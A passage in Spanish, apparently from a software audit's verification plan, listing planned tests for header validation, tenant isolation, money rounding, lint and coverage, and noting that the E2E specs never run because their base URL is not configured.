  precisamente el bug**. Para PR-11, test de que un `x-internal-retry` incorrecto
  se rechaza y de que la ruta interna no escala a otro tenant.
- **Bloque D (dinero).** Vectores de puntos medios para `redondear2`, incluyendo
  negativos y valores >1000, que es donde falla hoy. Para PR-23, un test que
  compare el TS contra los valores del SQL en los mismos instantes; idealmente
  con el harness de `scripts/conta-smoke/`.
- **Bloque F.** `npm run lint` y `npm run type-check` en verde con el alcance
  ampliado; `npm run test:coverage` sobre los umbrales nuevos.
- **E2E.** Los 9 specs de `e2e/*.e2e.ts` **nunca se ejecutan**: `E2E_BASE_URL`
  sigue sin configurar, así que el job es un no-op verde. Venía señalado en la
  auditoría de julio (F7/OP-5, S5) y **sigue abierto**. Configurar esos secretos es
  lo que convierte estas verificaciones en reales — acción de operador, no de
  código.
